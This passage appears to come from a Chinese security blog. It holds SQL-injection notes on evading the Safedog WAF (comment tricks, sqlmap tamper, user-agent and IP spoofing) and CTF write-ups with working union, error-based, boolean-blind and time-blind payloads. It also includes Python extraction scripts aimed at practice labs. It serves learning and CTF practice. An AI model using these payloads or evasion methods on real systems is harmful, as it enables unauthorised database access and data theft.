class="hljs-number">0</span>a%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span> <span class="hljs-comment">//加不加all效果一样</span></code></pre><p>推荐用FUZZ模糊测试=》脚本跑，一个个试效率低</p><pre><code class="hljs angelscript">SELECT * FROM users WHERE id=<span class="hljs-number">-1</span><span class="hljs-comment">/*%0a*/</span>union<span class="hljs-comment">/*%0a*/</span>select<span class="hljs-comment">/*%0a*/</span><span class="hljs-number">1</span>, <span class="hljs-number">2</span>,<span class="hljs-number">3</span>;id =<span class="hljs-number">-1</span> union%<span class="hljs-number">23</span>a%<span class="hljs-number">0</span>Aselect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;%<span class="hljs-number">23</span>  也就是id =<span class="hljs-number">-1</span> union #aselect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;#    <span class="hljs-comment">//注意#是单行注释，a为了隔开，再加个保证</span>id =<span class="hljs-number">-1</span> union<span class="hljs-comment">/*%00*/</span>%<span class="hljs-number">23</span>a%<span class="hljs-number">0</span>A<span class="hljs-comment">/*!/*!select 1,2,3*/</span>;%<span class="hljs-number">23</span></code></pre><h4 id="salmap-tamper">salmap tamper</h4><p>利用sqlmaptamper插件参数，对应文件夹下有各种自带脚本，我们也可以自己写然后用上<pre><code class="hljs routeros">python sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/test.php?id=1&quot;</span> <span class="hljs-attribute">--tamper</span>=dog.py <span class="hljs-attribute">--proxy</span>=http://127.0.0.1:8080   proxy是开启代理，可用burp查看请求信息</code></pre> ##### 绕过工具检测⚠️sqlmap请求时useragent会带上sqlmap的指纹，安全狗检测到会拦截，==工具直接被拦截==</p><p>=》对此我们修改useragent即可绕过拦截，sqlmap也有参数修改头<code>python sqlmap.py -u "http://127.0.0.1/test.php?id=1" --tamper=dog.py --proxy=http://127.0.0.1:8080 --random-agent</code>使用自带字典随机头访问</p><p>⚠️sqlmap太慢了可能是php版本过高，5.2.。。试试</p><h5 id="绕过流量检测">绕过流量检测</h5><p>安全狗的流量防护是检测访问速度【同一ip访问多次会被ban】</p><p>=》<strong>可以延时、代理池、爬虫</strong> 绕过</p><ol type="1"><li>爬虫 &gt; 百度 搜索引擎爬虫http头</li></ol><ul><li>sqlmap也可以自定义useragent头</li><li>在sqlmap目录下<code>lib/core/option.py</code>里的1425行</li><li>或者加参数<code>--user-agent="xxx"</code></li></ul><ol start="2" type="1"><li>延时</li></ol><ul><li><code>--delay 1</code> 隔1s发一个数据包</li></ul><ol start="3" type="1"><li>代理池</li></ol><p>拦一个ip我换一个，python爬虫脚本有关</p><h5 id="总结">总结</h5><p>⚠️类似的，若对其他地方头有拦截，写python脚本，--tamper加上【中转脚本】</p><p>也可以<code>-r 3.txt</code>把修改后的请求报文放到txt里，不要-u，用-r请求文件也可以实现自主绕过-即sqlmap注入本地脚本地址，=》本地搭建脚本（请求数据包自定义编写）=》目标地址&gt; 百度 php自定义http数据包请求</p><h4 id="白名单绕过">白名单绕过</h4><ol type="1"><li><p>ip白名单 获取对方服务器不会拦截的ip白名单，修改自己http header<code>x-forwarded-for ..</code>等来绕过安全狗拦截【一般不好获取，获得对方服务器本身的ip更容易，自己不会防自己，也可以绕过】</p></li><li><p>静态资源 以前可以用，现在不一定常见的静态文件：<code>.js .txt .jpg  .swf  .css</code>等，类似白名单机制，waf为了检测效率，不会检测这类文件名后缀的请求<code>http://127.0.0.1/test.php?id=1</code>改为<code>http://127.0.0.1/test.php/1.js?=1</code>页面不会变，但能绕过检测⚠️==Aspx、php只识别到前面的<code>.Aspx、.php</code>后面不识别==</p></li><li><p>url白名单waf内置白名单，只要url中存在白名单的字符串，就不检测</p></li><li><p>爬虫白名单通过对数据包伪造成搜索引擎访问，致使waf认为访问安全</p></li></ol><ul><li><code>UserAgent</code>，修改成搜索引擎的相关指纹，waf一旦检测到这个就不去管它了，否则会因多次访问而页面显示拦截</li></ul><h2 id="sql语法">sql语法</h2><ol type="1"><li><p>==<a href="==https://www.yiibai.com/sql/sql-limit.html">limit语句</a>：限制显示多少行，offset：跳过前几行</p><ul><li>mysql里可以省去offset：<code>LIMIT x,y</code> ：跳过前x行取y行</li></ul></li><li><p><code>mid（string,start,length）</code>类似于substr，返回制定长度字符串子串【<strong>字符串从1开始</strong>】</p></li><li><p><code>like '%aa'</code>匹配以aa结尾的字符串，<code>%</code>：匹配0个/一个/多个， <code>_</code>匹配一个</p></li><li><p><a href="https://www.jianshu.com/p/36363f4190df">sql里的反引号</a>：区分保留字，以免出错，如</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">`select`</span> <span class="hljs-keyword">FROM</span> <span class="hljs-string">`test`</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">select</span>=<span class="hljs-string">&#x27;字段值&#x27;</span></code></pre></li><li><p>别名as xxx，as可以省略</p></li></ol><h2 id="参考资料">🔗参考资料</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484372&amp;idx=1&amp;sn=ffcc51a88c9acf96c312421b75fc2a26&amp;chksm=ec1e33fcdb69baea53838fd545a236c0deb8a42f3b341ee0879c9e4ac9427c2147fab95b6669#rd">公众号，相关函数、报错注入布尔注入、时间注入，初级，配有小例子</a></p><h1 id="刷题">刷题✍️</h1><h3 id="整数型">整数型</h3><ol type="1"><li>判断是整数型还是字符型，有区别=》整数型</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439855.png" alt="image-20210719143944632" style="zoom: 50%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439856.png" alt="image-20210719144008063" style="zoom:50%;"></p><ol start="2" type="1"><li>判断列数，order by3页面不显示，则是2列</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439857.png" alt="image-20210719144050954" style="zoom:50%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439858.png" alt="image-20210719144101587" style="zoom:50%;"></p><ol start="3" type="1"><li>union，<strong>注意第一个参数要无效！否则union后面的不显示</strong></li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439859.png" alt="image-20210719144344234" style="zoom:50%;"></p><ol start="4" type="1"><li>找当前库下所有表名</li></ol><pre><code class="hljs url">http:&#x2F;&#x2F;challenge-a1d9c1878cb3631f.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;-1 union  select database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439860.png" alt="image-20210719144701149"></p><ol start="5" type="1"><li>获取特定表列名【==注意列名要加引号==】</li></ol><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span>  <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439861.png" alt="image-20210719144940366"></p><ol start="6" type="1"><li>获取具体数据【注意引号！】</li></ol><pre><code class="hljs crystal">?id=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>  <span class="hljs-title">select</span> <span class="hljs-title">database</span>(),<span class="hljs-title">flag</span> <span class="hljs-title">from</span> <span class="hljs-title">flag</span></span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439862.png" alt="image-20210719145233031"></p><h3 id="sqli_labs字符注入">sqli_labs字符注入</h3><ol type="1"><li>发现是字符注入</li></ol><p>联合注入：</p><p>​ - 爆库名</p><p>​<strong>可直接用hackbar输出，左边3是需3列才回显，右边是把输出放在第几列回显</strong></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439863.png" alt="image-20210523111629531" style="zoom:50%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439864.png" alt="image-20210523111656991" style="zoom: 50%;"></p><pre><code class="hljs mysql">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code></pre><p>​ - 爆表名</p><pre><code class="hljs mysql">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()%23</code></pre><p>​ - 爆所有库列名</p><pre><code class="hljs mysql">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database()%23</code></pre><p>​ - 爆当前库下指定表列名</p><pre><code class="hljs mysql">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;%23</code></pre><p>无列名报错注入join查列名【这时无需保证字段数为3，直接union select即可】</p><pre><code class="hljs mysql">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;&#39;union select * from (select * from users as a join users b using(id,username))c%23&#x2F;&#x2F;或者加上extractvalue，效果一样http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;&#39;union select extractvalue(0x0a,concat(0x0a,(select * from (select * from users as a join users b using(id,username))c)))%23</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439865.png" alt="image-20210523113654148" style="zoom:67%;"></p><h3 id="报错注入-1">报错注入</h3><ol type="1"><li>发现是整数，2列</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439866.png" alt="image-20210719153315081" style="zoom:67%;"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439867.png" alt="image-20210719153236931" style="zoom:67%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439868.png" alt="image-20210719153122597" style="zoom:67%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439869.png" alt="image-20210719153213247" style="zoom: 67%;"></p><ol start="2" type="1"><li>利用<strong>hackbar的快捷键</strong>extractvalue报错注入</li></ol><pre><code class="hljs pgsql">?id=extractvalue(<span class="hljs-number">0x0a</span>,concat(<span class="hljs-number">0x0a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())))</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439870.png" alt="image-20210719154014631" style="zoom:67%;"></p><ol start="4" type="1"><li>查表名</li></ol><pre><code class="hljs pgsql">?id=extractvalue(<span class="hljs-number">0x0a</span>,concat(<span class="hljs-number">0x0a</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>())))</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439871.png" alt="image-20210719154125986" style="zoom:67%;"></p><ol start="5" type="1"><li>查列名</li></ol><pre><code class="hljs pgsql">?id=extractvalue(<span class="hljs-number">0x0a</span>,concat(<span class="hljs-number">0x0a</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>())))</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439872.png" alt="image-20210719154218790" style="zoom:67%;"></p><ol start="6" type="1"><li>查数据</li></ol><pre><code class="hljs sqf">?id=extractvalue(<span class="hljs-number">0</span>x0a,concat(<span class="hljs-number">0</span>x0a,(<span class="hljs-built_in">select</span> group_concat(<span class="hljs-built_in">flag</span>) <span class="hljs-keyword">from</span> <span class="hljs-built_in">flag</span>)))</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439873.png" alt="image-20210719154257406" style="zoom:67%;"></p><h3 id="布尔注入">布尔注入</h3><blockquote><p><a href="https://blog.csdn.net/Xxy605/article/details/109750292?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">wp</a></p></blockquote><ol type="1"><li>整数型，2列</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439874.png" alt="image-20210719155150592" style="zoom:67%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439875.png" alt="image-20210719155311112" style="zoom:67%;"></p><ol start="2" type="1"><li>查找有无含flag列名的表=》有</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439876.png" alt="image-20210719155428893" style="zoom:80%;"></p><ol start="3" type="1"><li>查询当前库下有几个表，【==注意！用and==，or一定返回success】=》两个表</li></ol><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> count( <span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABlES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>( ) ) =<span class="hljs-number">2</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439877.png" alt="image-20210719160304316"></p><ol start="3" type="1"><li>获取第一个表的长度=》4=》**怀疑表名叫flag</li></ol><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> length( <span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABlES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>( ) <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) =<span class="hljs-number">4</span>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> length( <span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABlES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>( ) <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>) =<span class="hljs-number">4</span>  【第二个表名也是<span class="hljs-number">4</span>长度】</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439878.png" alt="image-20210719160513618"></p><ol start="3" type="1"><li>查询当前数据库下两个表名第一个字母是不是f</li></ol><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> mid((<span class="hljs-keyword">select</span> <span class="hljs-built_in">TABLE_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>( ) <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) =<span class="hljs-string">&#x27;f&#x27;</span>【第一个表报错，说明第二个表名是flag】?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> mid((<span class="hljs-keyword">select</span> <span class="hljs-built_in">TABLE_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>( ) <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>) ,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) =<span class="hljs-string">&#x27;f&#x27;</span>【success】</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439879.png" alt="image-20210719161041707"></p><ol start="4" type="1"><li>后面==用python自动化脚本布尔盲注爆破==【要跑一会】</li></ol><pre><code class="hljs python">重点代码：<span class="hljs-comment">#对指定库指定表指定列爆数据（flag）</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getData</span>(<span class="hljs-params">database,table,column,str_list</span>):</span><span class="hljs-comment">#初始化flag长度为1</span>    j = <span class="hljs-number">1</span>    <span class="hljs-comment">#j从1开始，无限循环flag长度</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-comment">#flag中每一个字符的所有可能取值</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str_list: <span class="hljs-comment">#str_list是字母表的ASCII码</span>            new_url = url + <span class="hljs-string">&quot;?id=1 and substr((select &#123;&#125; from &#123;&#125;.&#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(column,database,table,j,<span class="hljs-built_in">chr</span>(i))            r = requests.get(new_url)            <span class="hljs-comment">#如果返回的页面有query_success，即盲猜成功，跳过余下的for循环</span>            <span class="hljs-keyword">if</span> success_mark <span class="hljs-keyword">in</span> r.text:            <span class="hljs-comment">#显示flag</span>                print(<span class="hljs-built_in">chr</span>(i),end=<span class="hljs-string">&quot;&quot;</span>)                <span class="hljs-comment">#flag的终止条件，即flag的尾端右花括号</span>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(i) == <span class="hljs-string">&quot;&#125;&quot;</span>:                    print()                    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>                <span class="hljs-keyword">break</span>        <span class="hljs-comment">#如果没有匹配成功，flag长度+1接着循环</span>        j = j + <span class="hljs-number">1</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439880.png" alt="image-20210719170950999" style="zoom:80%;"></p><h3 id="时间盲注-1">时间盲注</h3><ul><li>sqlmap工具法：</li></ul><ol type="1"><li>爆库名=》发现4个库名</li></ol><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://challenge-<span class="hljs-number">53394</span>f<span class="hljs-number">4</span>a<span class="hljs-number">591385</span>b<span class="hljs-number">3</span>.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span> --dbs</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439881.png" alt="image-20210719173257617" style="zoom:80%;"></p><ol start="2" type="1"><li>爆表名</li></ol><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://challenge-c<span class="hljs-number">040</span>fe<span class="hljs-number">3754779</span>bb<span class="hljs-number">8</span>.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span> -D sqli --tables</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439882.png" alt="image-20210719223141434"></p><ol start="3" type="1"><li>爆列名</li></ol><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://challenge-c<span class="hljs-number">040</span>fe<span class="hljs-number">3754779</span>bb<span class="hljs-number">8</span>.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span> -D sqli -T flag --columns</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439883.png" alt="image-20210719223210839" style="zoom:67%;"></p><ol start="4" type="1"><li>爆数据</li></ol><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://challenge-c<span class="hljs-number">040</span>fe<span class="hljs-number">3754779</span>bb<span class="hljs-number">8</span>.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span> -D sqli -T flag -C flag --dump</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439884.png" alt="image-20210719224102387"></p><ul><li>手注法</li></ul><pre><code class="hljs sql">判断当前数据库名长，发现长度为4?id=1 and if(length(database())=4,1,sleep(3))判断当前库下表个数，为2时停三秒,说明有两张表?id=1 and if((<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>())=<span class="hljs-number">2</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)</code></pre><ul><li>python自动脚本</li></ul><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timeflag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span>    <span class="hljs-built_in">max</span>=<span class="hljs-number">127</span>    mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:        starttime = time.time()        <span class="hljs-comment">#pa = &#x27;1^if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),-1)^1&#x27;.format(str(i),str(mid)) 爆库</span>        <span class="hljs-comment">#pa = &quot;1^if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),-1)^1&quot;.format(str(i),str(mid)) 爆表</span>        <span class="hljs-comment">#pa = &quot;1^if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),-1)^1&quot;.format(str(i), str(mid)) 爆列</span>        pa = <span class="hljs-string">&quot;1^if(ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),-1)^1&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i), <span class="hljs-built_in">str</span>(mid))        url = <span class="hljs-string">&quot;http://challenge-c040fe3754779bb8.sandbox.ctfhub.com:10800/?id=&quot;</span>        ur=url+pa        res = requests.get(ur)        <span class="hljs-keyword">if</span> time.time() - starttime &gt; <span class="hljs-number">2</span>:            <span class="hljs-built_in">min</span>=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-built_in">max</span>=mid        mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)    <span class="hljs-comment">#得到flag</span></code></pre><h2 id="无列名注入例子">无列名注入例子</h2><h3 id="swpuctf2019">SWPUCTF2019</h3><p>参考：<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/12/12/mysql/">个人博客1知识点及wp</a>、<a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">个人博客2，wp更详细</a>、 <a href="https://www.anquanke.com/post/id/193512">information_schema外的思考</a></p><p>==要点: information_schema被过滤，无列名注入==</p><h4 id="知识点">知识点：</h4><ol type="1"><li><p><strong>空格和or被过滤，我们使用注释符号来代替空格</strong><code>/**/</code></p></li><li><p>or被过滤，我们无法使用orderby及information_schema进行数据查询，我们可以使用sys数据库进行数据查询，<strong>使用sys数据库需要满足：</strong></p></li></ol><blockquote><pre><code>1.数据库版本大于等于5.7  //version()2.数据库用户为root@localohost用户  //user()  【管理员身份】</code></pre></blockquote><ol start="3" type="1"><li><p>==！！==information_schema外，以下都可以查询表名信息【<strong>但查询不到列名，查询列名要用无列名注入</strong>】<a href="http://www.tristan.top/2020/04/22/Sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">参考1</a></p><pre><code class="hljs q">sys.schema_auto_increment_columns  <span class="hljs-comment">//有自增id</span>sys.schema_table_statistics_with_buffer <span class="hljs-comment">//无自增id</span>mysql.innodb_table_stats  <span class="hljs-comment">//一般关闭</span><span class="hljs-comment">//获取当前库里的表名</span>?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_auto_increment_columns <span class="hljs-built_in">where</span> table_schema=database()--+?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-built_in">where</span> table_schema=database()--+</code></pre></li></ol><p><img src="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212640240-1882833743.png" alt="innodb" style="zoom:67%;"></p><p><img src="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212521529-1650453614.png" alt="2"></p><p>查询表名：</p><pre><code class="hljs mysql">&#x2F;&#x2F;用sys.schema_auto_increment_columns11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_colum ns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;&#x2F;&#x2F;或者mysql.innodb_table_statsid&#x3D;-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;1</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439885.png" alt="image-20210522145658218" style="zoom:67%;"></p><p>查询列名，发现不行，用==无列名注入==：<strong>第一列应该为id所以从第二列找，第二列可能为name，第三列为password</strong></p><pre><code class="hljs mysql">重点：获取第二列所有行的数据：(select group_concat(a) from (select 1,2 as a,3 union select*from users)c)  &#x2F;&#x2F;第二列别名为a，第一列应该为id111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1，(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)c),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439886.png" alt="image-20210522150318206" style="zoom:67%;"></p><p>可以看到flag在第二个，我们查询一下对应第三列的值，即可查询出flag：</p><pre><code class="hljs mysql">重点：(select group_concat(b) from (select 1,2,3 as b union select*from users)c) &#x2F;&#x2F;查询flag对应第三列的值111&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)c),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439887.png" alt="image-20210522150330829" style="zoom:67%;"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网？公网？局域网？</title>
    <link href="/2021/06/20/%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"/>
    <url>/2021/06/20/%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/</url>
    
